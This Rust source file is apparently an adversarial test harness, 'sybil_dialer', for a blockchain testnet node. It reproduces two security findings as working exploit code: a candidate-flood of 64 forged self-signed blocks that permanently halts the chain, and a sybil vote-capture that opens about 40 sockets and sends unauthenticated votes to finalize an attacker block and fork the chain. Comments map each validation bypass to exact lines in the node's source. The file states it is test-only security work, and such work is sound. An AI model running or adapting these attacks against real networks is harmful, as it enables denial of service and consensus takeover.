//! sybil_dialer — adversarial harness client that reproduces finding QC-021
//! (per-height candidate-map exhaustion → permanent one-height halt).
//!
//! WHAT IT DOES (candidate-flood, the QC-021 vector)
//! -------------------------------------------------
//! A single libp2p socket dials a running node and publishes 64 EMPTY blocks at
//! a FUTURE height (applied_tip + 2), each signed by a fresh throwaway ed25519
//! wallet and carrying a FABRICATED random 32-byte `parent_hash`. Every such
//! block passes `validate_block_from_peer` (src/node/src/event_loop.rs:2345)
//! because:
//!   - chain_id == `commputer-testnet-3`  (event_loop.rs:2354, genesis.rs:6)
//!   - protocol_version == CURRENT_PROTOCOL_VERSION (event_loop.rs:2367, block.rs:28)
//!   - timestamp <= now+30                (event_loop.rs:2388)
//!   - the parent-timestamp check is SKIPPED because the node does not hold the
//!     fabricated parent (event_loop.rs:2399-2404)
//!   - height != 0                        (event_loop.rs:2448)
//!   - the producer signature only has to match the DECLARED producer, and a
//!     fresh wallet signs its own block (block.rs:225-238, event_loop.rs:2455)
//!   - merkle roots of empty tx/proof lists are all-zeros (block.rs:258-261)
//!   - `block_is_votable_on_tip` returns true on its FIRST disjunct because the
//!     fabricated parent != our tip (event_loop.rs:2737)
//! None of those checks require the producer to be a validator, bonded, or the
//! scheduled leader. The 64 distinct producers/hashes fill
//! `MAX_CANDIDATES_PER_HEIGHT = 64` (consensus_manager.rs:63) at that height;
//! the cap then DROPS the arriving candidate and preserves incumbents
//! (consensus_manager.rs:395-400), so when the honest leader's real block for
//! that height is produced it is dropped everywhere. The ballot only counts
//! candidates whose `parent_hash == tip_hash` (consensus_manager.rs:546), so
//! nothing at that height is votable, nothing finalizes, and the tip never
//! advances past it: a permanent one-height halt for ~64 self-signed empty
//! blocks from one socket.
//!
//! ATTACK VECTOR (default: gossip `BlockCandidate`)
//! ------------------------------------------------
//! The default vector publishes each crafted block as a
//! `ConsensusMessage::BlockCandidate` on the consensus gossip topic
//! (`commputer/consensus/0.1`, topics.rs:8). That frame is decoded at
//! event_loop.rs:1526-1528 and handled at event_loop.rs:2178, which calls
//! `add_candidate` (event_loop.rs:2198) — the exact ingress QC-021 names. This
//! path is NOT rate-limited (only the two request-response arms are;
//! consensus_rate_limiter.rs / event_loop.rs:1970), so all 64 land in ~1-2 s
//! inside the generic 50 msg/s gossip bucket (event_loop.rs:1464).
//!
//! `ConsensusMessage` is defined in the node BINARY crate (main.rs `mod
//! consensus_manager`) and is therefore NOT importable from this separate
//! binary. serde's default externally-tagged enum representation lets the
//! single-variant `WireConsensusMessage` below serialize BYTE-IDENTICALLY to
//! `{"BlockCandidate":{"block":<block>}}`; the block inside is serialized by the
//! real `commputer_core::block::Block` Serialize impl. The node decompresses
//! then `serde_json::from_slice::<ConsensusMessage>` (event_loop.rs:1505,1527),
//! matching the variant by name.
//!
//! An alternate `--vector rr` sends the same blocks via the request-response
//! `ConsensusRequest::BlockProposal { block_bytes, height }`
//! (consensus_protocol.rs:63), which reaches `add_candidate` at
//! event_loop.rs:1984. That arm IS rate-limited to 10/s per peer
//! (event_loop.rs:1970), so the rr vector paces slower — use a larger
//! `--future-offset` with it so the honest tip does not overtake the flood
//! height mid-flood.
//!
//! TRANSPORT: this binary reuses `commputer_network::transport::CommpNetwork`
//! wholesale, so the tcp/noise/yamux stack, the gossipsub config, the topic
//! constants and the request-response protocol IDs are IDENTICAL to the node's
//! by construction (transport.rs:249-330). It builds with agent_version
//! `commputer/0.1.0/unknown` so the target's genesis-hash identify check waves
//! it through (event_loop.rs:1687-1701 exempts an agent_version containing
//! "unknown").
//!
//! MODE `vote-capture` (the QC-009 vector — Snowball vote capture / fork)
//! -----------------------------------------------------------------------
//! Reproduces QC-009 against the Stage-2 clamp binary. The clamp pins the rung
//! at (3,2,1) — quorum 2, decision_threshold(beta) 1, sample k=3 — regardless of
//! socket count (consensus_manager.rs `RungInput::derive`, handle_consensus_tick
//! at event_loop.rs:4172). Vote intake is UNAUTHENTICATED: a `ConsensusResponse::
//! Vote{ preference }` from ANY connected PeerId is counted via
//! `record_peer_response` (event_loop.rs:2089 → consensus_manager.rs:725). This
//! mode:
//!   1. Opens N (~40) held sockets to ONE target; each enters the node's
//!      `peer_ips` unconditionally (event_loop.rs:1630), and 40+2 < MAX_PEERS=50
//!      so none are evicted.
//!   2. Answers the node's OWN outbound `ConsensusRequest::BlockProposal`
//!      (the proposer sends one to every peer, event_loop.rs:4104/4195) — which
//!      arrives at each socket as an inbound request-response `Request`. From the
//!      honest block in that proposal it learns the exact `(height, parent_hash,
//!      timestamp)`, so the attacker block B it crafts is guaranteed tip-parented
//!      at the height under active consensus (no fabricated parent, no future
//!      height — unlike candidate-flood). B is EMPTY and signed by a FIXED
//!      throwaway wallet, so B is byte-identical across every socket (ed25519 is
//!      deterministic) and its producer address (`ATTACK_PRODUCER`) is stable.
//!   3. Seeds B into the node so it is HELD as a candidate (the tally filters to
//!      held, tip-parented candidates, consensus_manager.rs:794): each socket
//!      replies to the proposal with `Vote{ preference = B.hash() }` AND re-sends
//!      B back as its own `BlockProposal` (reaches `add_candidate`,
//!      event_loop.rs:1984) plus a best-effort `BlockCandidate` gossip.
//!   4. ~40 distinct-PeerId votes for B dominate the k=3 sample, so B reaches
//!      quorum 2 and finalizes in one beta=1 round (snowball.rs:130-162). B is
//!      then applied (apply_block_validated has no producer/leader gate and does
//!      not verify state_root — state.rs:1272-1330): "Finalized and applied block
//!      <B.hash()>" appears in the victim's log — a self-produced tip is
//!      finalized, i.e. finalization capture / fork.
//! The CRUX message the node turns into a counted vote is the
//! `ConsensusResponse::Vote` we send as the RESPONSE to the node's
//! `ConsensusRequest::BlockProposal`; it reaches the node as an
//! `RrMessage::Response` and is counted at event_loop.rs:2089.
//!
//! This is TEST/ATTACK infrastructure for the formation harness only. It is
//! built with `--features formation-test` into `target/formation` and is never
//! part of a release.

use std::collections::HashMap;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use futures::{FutureExt, StreamExt};
use libp2p::request_response::{Event as RrEvent, Message as RrMessage};
use libp2p::swarm::SwarmEvent;
use libp2p::{Multiaddr, PeerId};
use rand::RngCore;

use commputer_core::block::{Block, BlockHash, BlockHeader, CURRENT_PROTOCOL_VERSION};
use commputer_core::genesis::TESTNET_CHAIN_ID;
use commputer_core::signing::sign_block;
use commputer_core::wallet::Wallet;
use commputer_network::consensus_protocol::{ConsensusRequest, ConsensusResponse};
use commputer_network::topics;
use commputer_network::transport::{CommpBehaviourEvent, CommpNetwork};

/// Wire-compatible mirror of the node's `ConsensusMessage::BlockCandidate`.
///
/// The real enum lives in the node binary crate (`main.rs` `mod
/// consensus_manager`), so it cannot be imported here. serde's default
/// externally-tagged representation makes this single-variant enum serialize
/// byte-identically to `{"BlockCandidate":{"block":<block>}}`, which the node
/// deserializes into its own `ConsensusMessage::BlockCandidate` at
/// `event_loop.rs:1527`. The `Block` is serialized by the real
/// `commputer_core::block::Block` `Serialize` impl, so only the one-level
/// enum wrapper is mirrored.
#[derive(serde::Serialize)]
enum WireConsensusMessage {
    #[allow(dead_code)]
    BlockCandidate { block: Block },
}

struct Args {
    /// Victim p2p listen multiaddr, e.g. `/ip4/127.0.0.1/tcp/19101`.
    target: String,
    /// Victim RPC base URL, e.g. `http://127.0.0.1:19145`.
    target_rpc: String,
    /// `candidate-flood` | `socket-flood` | `vote-capture` | `silent`.
    mode: String,
    /// Number of crafted candidates (candidate-flood) or sockets
    /// (socket-flood / vote-capture).
    count: usize,
    /// candidate-flood ingress: `gossip` (default) | `rr`.
    vector: String,
    /// flood_height = tip + future_offset (default 2), unless --flood-height set.
    future_offset: u64,
    /// Explicit flood height; skips the RPC tip read when present.
    flood_height: Option<u64>,
    /// Hold duration for socket-flood / silent.
    hold_secs: u64,
}

fn print_usage() {
    eprintln!(
        "sybil_dialer — QC-021 adversarial harness client\n\
         \n\
         USAGE:\n\
         \x20 sybil_dialer --target <multiaddr> --target-rpc <url> \\\n\
         \x20              [--mode candidate-flood|socket-flood|vote-capture|silent] \\\n\
         \x20              [--count N] [--vector gossip|rr] \\\n\
         \x20              [--future-offset N] [--flood-height N] [--hold-secs N]\n\
         \n\
         vote-capture (QC-009): --count sockets (default 40), holds --hold-secs;\n\
         \x20 each socket answers the node's BlockProposal with a Vote for a\n\
         \x20 self-produced tip-parented empty block to finalize it (fork).\n\
         \n\
         DEFAULTS: --mode candidate-flood --count 64 --vector gossip \\\n\
         \x20        --future-offset 2 --hold-secs 60\n"
    );
}

fn parse_args() -> Option<Args> {
    let mut target = String::new();
    let mut target_rpc = String::new();
    let mut mode = "candidate-flood".to_string();
    let mut count: usize = 64;
    let mut vector = "gossip".to_string();
    let mut future_offset: u64 = 2;
    let mut flood_height: Option<u64> = None;
    let mut hold_secs: u64 = 60;

    let mut it = std::env::args().skip(1);
    while let Some(flag) = it.next() {
        match flag.as_str() {
            "--target" => target = it.next().unwrap_or_default(),
            "--target-rpc" => target_rpc = it.next().unwrap_or_default(),
            "--mode" => mode = it.next().unwrap_or_default(),
            "--count" => count = it.next().and_then(|v| v.parse().ok()).unwrap_or(64),
            "--vector" => vector = it.next().unwrap_or_default(),
            "--future-offset" => {
                future_offset = it.next().and_then(|v| v.parse().ok()).unwrap_or(2)
            }
            "--flood-height" => flood_height = it.next().and_then(|v| v.parse().ok()),
            "--hold-secs" => hold_secs = it.next().and_then(|v| v.parse().ok()).unwrap_or(60),
            "--help" | "-h" => {
                print_usage();
                return None;
            }
            other => {
                eprintln!("[sybil] unknown argument: {other}");
                print_usage();
                return None;
            }
        }
    }

    if target.is_empty() {
        eprintln!("[sybil] --target <multiaddr> is required");
        print_usage();
        return None;
    }

    Some(Args {
        target,
        target_rpc,
        mode,
        count,
        vector,
        future_offset,
        flood_height,
        hold_secs,
    })
}

/// Craft one EMPTY, validly-signed block at `height` with a fabricated random
/// parent hash and a fresh throwaway wallet. Mirrors the node's own producer
/// path (event_loop.rs:4056-4096) minus the state_root computation, which
/// `validate_block_from_peer` never checks.
fn craft_empty_block(height: u64) -> Block {
    let wallet = Wallet::generate();

    let mut parent = [0u8; 32];
    rand::rngs::OsRng.fill_bytes(&mut parent);

    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let mut block = Block {
        header: BlockHeader {
            protocol_version: CURRENT_PROTOCOL_VERSION,
            height,
            parent_hash: BlockHash(parent),
            tx_root: [0u8; 32],
            proof_root: [0u8; 32],
            state_root: [0u8; 32],
            timestamp: now,
            producer: *wallet.address(),
            epoch: 0,
            producer_public_key: vec![],
            signature: vec![],
            checkpoint_hash: None,
            chain_id: TESTNET_CHAIN_ID.to_string(),
        },
        transactions: vec![],
        proof_summaries: vec![],
        compliance_summary: None,
        epoch_summary: None,
    };

    // Merkle roots of empty lists are all-zeros; compute explicitly so
    // `verify_roots` (event_loop.rs:2463) passes exactly as for a real block.
    block.header.tx_root = block.compute_tx_root();
    block.header.proof_root = block.compute_proof_root();
    // state_root left zero: it is not checked at candidate time (only apply
    // checks it, and this block never reaches apply). It is covered by the
    // signature we set next, so the signature stays valid.
    sign_block(&mut block, &wallet);
    block
}

/// Read the victim's applied tip height from `<rpc>/status`.
async fn read_tip_height(rpc: &str) -> Option<u64> {
    if rpc.is_empty() {
        return None;
    }
    let url = format!("{}/status", rpc.trim_end_matches('/'));
    match reqwest::get(&url).await {
        Ok(resp) => match resp.json::<serde_json::Value>().await {
            Ok(v) => v.get("height").and_then(|h| h.as_u64()),
            Err(e) => {
                eprintln!("[sybil] /status returned unparseable JSON: {e}");
                None
            }
        },
        Err(e) => {
            eprintln!("[sybil] failed to GET {url}: {e}");
            None
        }
    }
}

/// Handle one swarm event: learn the target peer id and force it into the
/// gossipsub mesh via `add_explicit_peer` so publishes reach it regardless of
/// mesh scoring. Generic over the behaviour event so we need not name the
/// auto-derived `CommpBehaviourEvent`.
fn handle_event<E>(net: &mut CommpNetwork, ev: SwarmEvent<E>, target_peer: &mut Option<PeerId>) {
    match ev {
        SwarmEvent::ConnectionEstablished { peer_id, .. } => {
            if target_peer.is_none() {
                eprintln!("[sybil] connected to target peer {peer_id}");
            }
            *target_peer = Some(peer_id);
            net.swarm
                .behaviour_mut()
                .gossipsub
                .add_explicit_peer(&peer_id);
        }
        SwarmEvent::OutgoingConnectionError { error, .. } => {
            eprintln!("[sybil] outgoing connection error: {error}");
        }
        _ => {}
    }
}

/// Drive the swarm for `dur`, dispatching events. This is how connections are
/// established, subscriptions exchanged, and outbound frames flushed — a libp2p
/// swarm makes no progress unless it is polled.
async fn drive_for(net: &mut CommpNetwork, dur: Duration, target_peer: &mut Option<PeerId>) {
    let end = Instant::now() + dur;
    loop {
        let now = Instant::now();
        if now >= end {
            return;
        }
        let step = (end - now).min(Duration::from_millis(200));
        match tokio::time::timeout(step, net.swarm.select_next_some()).await {
            Ok(ev) => handle_event(net, ev, target_peer),
            Err(_) => {} // step elapsed with no event — keep looping until `end`
        }
    }
}

/// The QC-021 candidate-flood.
async fn run_candidate_flood(args: &Args) -> i32 {
    eprintln!(
        "[sybil] candidate-flood: count={} vector={} future_offset={}",
        args.count, args.vector, args.future_offset
    );

    let mut net = match CommpNetwork::new_with_keypair_path(0, None, "unknown") {
        Ok(n) => n,
        Err(e) => {
            eprintln!("[sybil] failed to build network: {e}");
            return 2;
        }
    };

    let target: Multiaddr = match args.target.parse() {
        Ok(a) => a,
        Err(e) => {
            eprintln!("[sybil] bad --target multiaddr {:?}: {e}", args.target);
            return 2;
        }
    };
    if let Err(e) = net.dial(target) {
        eprintln!("[sybil] dial failed: {e}");
        return 2;
    }

    // Wait for the connection to establish.
    let mut target_peer: Option<PeerId> = None;
    let connect_deadline = Instant::now() + Duration::from_secs(30);
    while target_peer.is_none() && Instant::now() < connect_deadline {
        drive_for(&mut net, Duration::from_millis(300), &mut target_peer).await;
    }
    let peer = match target_peer {
        Some(p) => p,
        None => {
            eprintln!("[sybil] never connected to target within 30s");
            return 2;
        }
    };

    // Settle: let gossipsub subscriptions propagate and the mesh GRAFT so a
    // publish is delivered rather than rejected with InsufficientPeers.
    eprintln!("[sybil] connected; settling mesh for 5s before publishing");
    drive_for(&mut net, Duration::from_secs(5), &mut target_peer).await;

    // Determine flood_height AFTER settling, so it is above the tip at PUBLISH
    // time — reading it before connect+settle would let the honest tip advance
    // past it during setup, and the flood would then target an already-applied
    // height (dropped at consensus_manager.rs:384). `applied_tip + future_offset`
    // stays comfortably inside MAX_HEIGHT_WINDOW=1024 and above the tip, so it is
    // admitted but never pruned while the flood lands (~1-2 s).
    let flood_height = match args.flood_height {
        Some(h) => h,
        None => match read_tip_height(&args.target_rpc).await {
            Some(tip) => tip + args.future_offset,
            None => {
                eprintln!(
                    "[sybil] could not read tip from RPC and no --flood-height given; aborting"
                );
                return 2;
            }
        },
    };
    eprintln!("[sybil] flooding height {flood_height} with {} candidates", args.count);

    // Craft all candidates: distinct fresh wallet + fabricated parent each, so
    // `count` distinct hashes fill the per-height cap (MAX_CANDIDATES_PER_HEIGHT).
    let blocks: Vec<Block> = (0..args.count).map(|_| craft_empty_block(flood_height)).collect();

    let mut sent = 0usize;
    for (i, block) in blocks.iter().enumerate() {
        if args.vector == "rr" {
            let req = ConsensusRequest::BlockProposal {
                block_bytes: serde_json::to_vec(block).unwrap_or_default(),
                height: flood_height,
            };
            let _ = net.swarm.behaviour_mut().consensus.send_request(&peer, req);
            sent += 1;
            eprintln!(
                "[sybil] rr BlockProposal {}/{} at height {flood_height}",
                i + 1,
                args.count
            );
            // Stay under the 10/s ConsensusRateLimiter (event_loop.rs:1970).
            drive_for(&mut net, Duration::from_millis(130), &mut target_peer).await;
        } else {
            let msg = WireConsensusMessage::BlockCandidate {
                block: block.clone(),
            };
            let json = serde_json::to_vec(&msg).unwrap_or_default();
            // Gossip frames are deflate-compressed with a 1-byte prefix
            // (compress.rs); the node decompresses at event_loop.rs:1505.
            let wire = commputer_network::compress(&json);

            let pub_deadline = Instant::now() + Duration::from_secs(20);
            loop {
                let topic = topics::consensus_topic();
                match net.swarm.behaviour_mut().gossipsub.publish(topic, wire.clone()) {
                    Ok(_) => {
                        sent += 1;
                        eprintln!(
                            "[sybil] gossip BlockCandidate {}/{} at height {flood_height}",
                            i + 1,
                            args.count
                        );
                        break;
                    }
                    Err(e) => {
                        let es = format!("{e:?}");
                        if es.contains("InsufficientPeers") && Instant::now() < pub_deadline {
                            // Mesh not formed yet — drive a heartbeat and retry.
                            drive_for(&mut net, Duration::from_millis(400), &mut target_peer).await;
                            continue;
                        }
                        eprintln!("[sybil] publish error on candidate {}: {es}", i + 1);
                        break;
                    }
                }
            }
            // Pace under the generic 50 msg/s gossip bucket (event_loop.rs:1464).
            drive_for(&mut net, Duration::from_millis(30), &mut target_peer).await;
        }
    }

    // Flush: drive the swarm so any queued frames actually leave the socket.
    eprintln!("[sybil] published {sent}/{} candidates; flushing for 3s", args.count);
    drive_for(&mut net, Duration::from_secs(3), &mut target_peer).await;

    if sent == args.count {
        0
    } else {
        eprintln!("[sybil] only {sent}/{} candidates were sent", args.count);
        1
    }
}

/// Secondary (QC-001) scenario: open `--count` distinct libp2p connections
/// (distinct PeerIds) to the target and hold them to inflate the peer count /
/// consensus rung. Kept simple: one swarm per identity, dial, hold.
async fn run_socket_flood(args: &Args) -> i32 {
    eprintln!(
        "[sybil] socket-flood: opening {} distinct connections, holding {}s",
        args.count, args.hold_secs
    );
    let target: Multiaddr = match args.target.parse() {
        Ok(a) => a,
        Err(e) => {
            eprintln!("[sybil] bad --target multiaddr {:?}: {e}", args.target);
            return 2;
        }
    };

    let mut nets: Vec<CommpNetwork> = Vec::new();
    for i in 0..args.count {
        match CommpNetwork::new_with_keypair_path(0, None, "unknown") {
            Ok(mut n) => match n.dial(target.clone()) {
                Ok(()) => nets.push(n),
                Err(e) => eprintln!("[sybil] socket {i}: dial failed: {e}"),
            },
            Err(e) => eprintln!("[sybil] socket {i}: build failed: {e}"),
        }
    }
    eprintln!("[sybil] {} sockets dialed; holding", nets.len());

    // Drive every swarm round-robin so the connections stay live for the hold.
    let end = Instant::now() + Duration::from_secs(args.hold_secs);
    let mut ignore: Option<PeerId> = None;
    while Instant::now() < end {
        for n in nets.iter_mut() {
            drive_for(n, Duration::from_millis(20), &mut ignore).await;
        }
    }
    0
}

// ==========================================================================
// vote-capture (QC-009)
// ==========================================================================

/// A FIXED attacker wallet, reconstructed identically on every call and by
/// every socket, so B is byte-identical across sockets and `ATTACK_PRODUCER`
/// is stable and printable for the whole run.
///
/// Seed: the BIP39 mnemonic for 32 bytes of ZERO entropy (23×"abandon" + "art").
/// `Wallet::from_secret_bytes` is private, but `from_seed_phrase` is public and
/// deterministic, and a fixed valid mnemonic is the cleanest fixed keypair the
/// public API allows.
fn fixed_attacker_wallet() -> Wallet {
    let mut words: Vec<&str> = vec!["abandon"; 23];
    words.push("art");
    let phrase = words.join(" ");
    Wallet::from_seed_phrase(&phrase).expect("zero-entropy 24-word mnemonic is valid BIP39")
}

/// The node's `BlockHash` Display is `hex::encode(&hash.0[..8])` (block.rs:21),
/// which is exactly what the apply log line prints
/// ("Finalized and applied block <this> at height <h>", event_loop.rs:4433).
/// The scenario greps for this 16-hex prefix to detect a CAPTURED block.
fn short_hash(h: &BlockHash) -> String {
    hex::encode(&h.0[..8])
}

/// Craft one EMPTY, validly-signed block at `height`, parented on the REAL tip
/// (`parent`) with a fixed `timestamp`/`epoch` learned from the honest proposal.
/// DETERMINISTIC: identical inputs + the fixed wallet ⇒ identical bytes/hash
/// across every socket, so all sockets vote the SAME hash and their votes
/// aggregate (rather than splitting across per-socket variants).
fn craft_attack_block(
    height: u64,
    parent: BlockHash,
    timestamp: u64,
    epoch: u64,
    wallet: &Wallet,
) -> Block {
    let mut block = Block {
        header: BlockHeader {
            protocol_version: CURRENT_PROTOCOL_VERSION,
            height,
            parent_hash: parent,
            tx_root: [0u8; 32],
            proof_root: [0u8; 32],
            state_root: [0u8; 32],
            timestamp,
            producer: *wallet.address(),
            epoch,
            producer_public_key: vec![],
            signature: vec![],
            checkpoint_hash: None,
            chain_id: TESTNET_CHAIN_ID.to_string(),
        },
        transactions: vec![],
        proof_summaries: vec![],
        compliance_summary: None,
        epoch_summary: None,
    };
    block.header.tx_root = block.compute_tx_root();
    block.header.proof_root = block.compute_proof_root();
    // state_root left zero: apply does NOT verify it (F25, state.rs:1327).
    sign_block(&mut block, wallet);
    block
}

/// Per-socket handler for the vote-capture loop. Named `CommpBehaviourEvent`
/// (auto-derived, re-exported from `commputer_network::transport`) so it can
/// match the inbound consensus request-response messages the generic
/// `handle_event` deliberately ignores.
#[allow(clippy::too_many_arguments)]
fn handle_vote_event(
    net: &mut CommpNetwork,
    ev: SwarmEvent<CommpBehaviourEvent>,
    wallet: &Wallet,
    memo: &mut HashMap<(u64, BlockHash), Block>,
    seed_counts: &mut HashMap<u64, usize>,
    seed_redundancy: usize,
    connected: &mut usize,
) {
    match ev {
        SwarmEvent::ConnectionEstablished { peer_id, .. } => {
            *connected += 1;
            // Force the target into the gossipsub mesh so the best-effort
            // BlockCandidate seed can reach it regardless of mesh scoring.
            net.swarm
                .behaviour_mut()
                .gossipsub
                .add_explicit_peer(&peer_id);
        }
        SwarmEvent::Behaviour(CommpBehaviourEvent::Consensus(RrEvent::Message {
            peer,
            message,
        })) => match message {
            RrMessage::Request { request, channel, .. } => match request {
                // The node (proposer) sends us its honest block for `height`.
                // We learn the height + real parent + timestamp from it, craft
                // our tip-parented empty B, VOTE for B on this channel, and seed
                // B so the node holds it as a votable candidate.
                ConsensusRequest::BlockProposal { block_bytes, height } => {
                    let (parent, ts, epoch) =
                        match serde_json::from_slice::<Block>(&block_bytes) {
                            Ok(hb) => (
                                hb.header.parent_hash,
                                hb.header.timestamp,
                                hb.header.epoch,
                            ),
                            Err(_) => {
                                let _ = net.swarm.behaviour_mut().consensus.send_response(
                                    channel,
                                    ConsensusResponse::NotReady { height, tip: 0 },
                                );
                                return;
                            }
                        };
                    let key = (height, parent);
                    let (bhash, b_clone) = {
                        let b = memo.entry(key).or_insert_with(|| {
                            let blk = craft_attack_block(height, parent, ts, epoch, wallet);
                            // STABLE, greppable: one line per distinct attack
                            // block. `hash=` matches the node's apply-log Display.
                            eprintln!(
                                "ATTACK_BLOCK height={} hash={} parent={} producer={}",
                                height,
                                short_hash(&blk.hash()),
                                short_hash(&parent),
                                hex::encode(blk.header.producer.0)
                            );
                            blk
                        });
                        (b.hash(), b.clone())
                    };
                    // THE CRUX: this Vote reaches the node as an RrMessage::Response
                    // and is counted by record_peer_response (event_loop.rs:2089).
                    let _ = net.swarm.behaviour_mut().consensus.send_response(
                        channel,
                        ConsensusResponse::Vote {
                            height,
                            preference: bhash.0,
                            accept: true,
                        },
                    );
                    // Seed B (bounded redundancy) so the node HOLDS it: both the
                    // request-response add_candidate path (event_loop.rs:1984) and
                    // the gossip BlockCandidate path (event_loop.rs:2198).
                    let c = seed_counts.entry(height).or_insert(0);
                    if *c < seed_redundancy {
                        let bytes = serde_json::to_vec(&b_clone).unwrap_or_default();
                        let req = ConsensusRequest::BlockProposal {
                            block_bytes: bytes,
                            height,
                        };
                        let _ = net
                            .swarm
                            .behaviour_mut()
                            .consensus
                            .send_request(&peer, req);
                        let gmsg = WireConsensusMessage::BlockCandidate { block: b_clone };
                        if let Ok(json) = serde_json::to_vec(&gmsg) {
                            let wire = commputer_network::compress(&json);
                            let _ = net
                                .swarm
                                .behaviour_mut()
                                .gossipsub
                                .publish(topics::consensus_topic(), wire);
                        }
                        *c += 1;
                    }
                }
                // Node asks a non-voter for a vote. Answer with B if we already
                // hold one for this height; else NotReady (the node re-sends the
                // full BlockProposal to non-voters, so this arm is rarely hit).
                ConsensusRequest::VoteRequest { height, .. } => {
                    let known = memo
                        .iter()
                        .find(|((h, _), _)| *h == height)
                        .map(|(_, b)| b.hash());
                    let resp = match known {
                        Some(bh) => ConsensusResponse::Vote {
                            height,
                            preference: bh.0,
                            accept: true,
                        },
                        None => ConsensusResponse::NotReady { height, tip: 0 },
                    };
                    let _ = net
                        .swarm
                        .behaviour_mut()
                        .consensus
                        .send_response(channel, resp);
                }
            },
            // The node's reply to our own seed BlockProposal — irrelevant.
            RrMessage::Response { .. } => {}
        },
        SwarmEvent::OutgoingConnectionError { error, .. } => {
            eprintln!("[sybil] outgoing connection error: {error}");
        }
        _ => {}
    }
}

/// The QC-009 vote-capture: hold N sockets, answer the node's BlockProposals
/// with votes for a self-produced tip-parented empty block, and finalize it.
async fn run_vote_capture(args: &Args) -> i32 {
    let wallet = fixed_attacker_wallet();
    let addr = *wallet.address();
    // STABLE identifiers for the scenario. Printed to stdout AND stderr so they
    // survive whichever stream the harness captures.
    let hex_addr = hex::encode(addr.0);
    let bytes_json = serde_json::to_string(&addr.0).unwrap_or_default();
    println!("ATTACK_PRODUCER={hex_addr}");
    println!("ATTACK_PRODUCER_DISPLAY={addr}");
    println!("ATTACK_PRODUCER_BYTES={bytes_json}");
    eprintln!("ATTACK_PRODUCER={hex_addr}");
    eprintln!(
        "[sybil] vote-capture: sockets={} hold={}s target={}",
        args.count, args.hold_secs, args.target
    );

    let target: Multiaddr = match args.target.parse() {
        Ok(a) => a,
        Err(e) => {
            eprintln!("[sybil] bad --target multiaddr {:?}: {e}", args.target);
            return 2;
        }
    };

    // Build and dial N sockets, each a distinct PeerId (distinct voter).
    let mut socks: Vec<CommpNetwork> = Vec::new();
    for i in 0..args.count {
        match CommpNetwork::new_with_keypair_path(0, None, "unknown") {
            Ok(mut n) => match n.dial(target.clone()) {
                Ok(()) => socks.push(n),
                Err(e) => eprintln!("[sybil] socket {i}: dial failed: {e}"),
            },
            Err(e) => eprintln!("[sybil] socket {i}: build failed: {e}"),
        }
    }
    if socks.is_empty() {
        eprintln!("[sybil] no sockets built — aborting");
        return 2;
    }
    eprintln!("[sybil] {} sockets dialed; holding {}s", socks.len(), args.hold_secs);

    let mut memo: HashMap<(u64, BlockHash), Block> = HashMap::new();
    let mut seed_counts: HashMap<u64, usize> = HashMap::new();
    const SEED_REDUNDANCY: usize = 3;
    let mut connected = 0usize;

    // Responsive multi-swarm driver: drain every socket's ready events each
    // pass (a per-socket blocking timeout would poll 40 sockets too slowly to
    // answer proposals inside the 500ms consensus tick). Sleep only when idle.
    let end = Instant::now() + Duration::from_secs(args.hold_secs);
    let mut last_report = Instant::now();
    while Instant::now() < end {
        let mut progressed = false;
        for sock in socks.iter_mut() {
            while let Some(ev) = sock.swarm.select_next_some().now_or_never() {
                progressed = true;
                handle_vote_event(
                    sock,
                    ev,
                    &wallet,
                    &mut memo,
                    &mut seed_counts,
                    SEED_REDUNDANCY,
                    &mut connected,
                );
            }
        }
        if last_report.elapsed() >= Duration::from_secs(15) {
            eprintln!(
                "[sybil] vote-capture progress: connects={} distinct-attack-blocks={} heights-seeded={}",
                connected,
                memo.len(),
                seed_counts.len()
            );
            last_report = Instant::now();
        }
        if !progressed {
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
    }
    eprintln!(
        "[sybil] vote-capture done: connects={} distinct-attack-blocks={} heights-seeded={}",
        connected,
        memo.len(),
        seed_counts.len()
    );
    0
}

/// Control: connect once and idle.
async fn run_silent(args: &Args) -> i32 {
    let mut net = match CommpNetwork::new_with_keypair_path(0, None, "unknown") {
        Ok(n) => n,
        Err(e) => {
            eprintln!("[sybil] failed to build network: {e}");
            return 2;
        }
    };
    let target: Multiaddr = match args.target.parse() {
        Ok(a) => a,
        Err(e) => {
            eprintln!("[sybil] bad --target multiaddr {:?}: {e}", args.target);
            return 2;
        }
    };
    if let Err(e) = net.dial(target) {
        eprintln!("[sybil] dial failed: {e}");
        return 2;
    }
    eprintln!("[sybil] silent: connected/idle for {}s", args.hold_secs);
    let mut tp: Option<PeerId> = None;
    drive_for(&mut net, Duration::from_secs(args.hold_secs), &mut tp).await;
    0
}

#[tokio::main]
async fn main() {
    let args = match parse_args() {
        Some(a) => a,
        None => std::process::exit(2),
    };

    let code = match args.mode.as_str() {
        "candidate-flood" => run_candidate_flood(&args).await,
        "socket-flood" => run_socket_flood(&args).await,
        "vote-capture" => run_vote_capture(&args).await,
        "silent" => run_silent(&args).await,
        other => {
            eprintln!("[sybil] unknown --mode '{other}'");
            print_usage();
            2
        }
    };
    std::process::exit(code);
}
